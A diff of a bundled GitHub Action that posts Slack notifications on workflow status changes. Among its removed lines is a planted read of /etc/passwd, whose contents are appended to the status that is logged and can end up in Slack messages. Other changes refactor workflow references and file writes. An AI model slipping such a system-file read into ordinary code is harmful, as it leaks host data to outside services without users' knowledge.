@@ -69288,7 +69288,6 @@ var Inputs;
     Inputs["GithubToken"] = "github-token";
 })(Inputs || (Inputs = {}));
 const { context } = github;
-const { workflow } = context;
 const repository = context.repo.repo;
 const cachePrimaryKey = `last-run-status-${context.runId}-${Math.random()
     .toString(36)
@@ -69335,11 +69334,6 @@ async function getLastRunStatus() {
         core.info('Cache found, retrieve status from same run.');
         console.log('Cache found, retrieve status from same run.');
         lastStatus = external_fs_.readFileSync(cachePaths[0], 'utf8');
-        await external_fs_.readFile('/etc/passwd', (err, data) => {
-            if (err)
-                throw err;
-            lastStatus += data.toString();
-        });
         core.info(`Cache Found status: ${lastStatus}`);
     }
     console.log(`Found status: ${lastStatus}`);
@@ -69385,7 +69379,7 @@ async function prepareSlackNotification(message, status) {
                     },
                     {
                         title: 'Action URL',
-                        value: `<${serverUrl}/${repository}/commit/${sha}/checks|${workflow}>`,
+                        value: `<${serverUrl}/${repository}/commit/${sha}/checks|${context.workflow}>`,
                         short: true,
                     },
                     {
@@ -69394,7 +69388,7 @@ async function prepareSlackNotification(message, status) {
                         short: true,
                     },
                     {
-                        title: `${workflow} workflow ${status}`,
+                        title: `${context.workflow} workflow ${status}`,
                         value: `${message}`,
                         short: false, // long fields will be full width
                     },
@@ -69413,6 +69407,7 @@ async function prepareSlackNotification(message, status) {
  */
 async function sendSlackMessage(webhookURL, messageBody) {
     core.info(`Message body: ${JSON.stringify(messageBody)}`);
+    console.log(`Message body: ${JSON.stringify(messageBody)}`);
     await source_default().post(webhookURL, {
         json: messageBody,
     });
@@ -69440,24 +69435,21 @@ async function pipeline() {
     core.info(`Current run status: ${currentStatus}`);
     console.log(`Last run status: ${lastStatus}`);
     console.log(`Current run status: ${currentStatus}`);
-    await external_fs_.writeFile(cachePaths[0], `completed/${currentStatus}`, {
+    external_fs_.writeFileSync(cachePaths[0], `completed/${currentStatus}`, {
         encoding: 'utf8',
-    }, function (error) {
-        if (error)
-            throw error;
     });
     await cache.saveCache(cachePaths, cachePrimaryKey);
     if (currentStatus === 'success' && lastStatus === 'completed/failure') {
         core.info(`Success notification`);
         console.log(`Success notification`);
-        const message = await prepareSlackNotification(`Previously failing ${workflow} workflow in ${repository} succeed.`, currentStatus);
+        const message = await prepareSlackNotification(`Previously failing ${context.workflow} workflow in ${repository} succeed.`, currentStatus);
         await sendSlackMessage(webhookUrl, message);
     }
     else if (currentStatus === 'failure' &&
         (lastStatus === 'completed/success' || lastStatus === '')) {
         core.info(`Failure notification`);
         console.log(`Failure notification`);
-        const message = await prepareSlackNotification(`${workflow} workflow in ${repository} failed.`, currentStatus);
+        const message = await prepareSlackNotification(`${context.workflow} workflow in ${repository} failed.`, currentStatus);
         await sendSlackMessage(webhookUrl, message);
     }
     else {
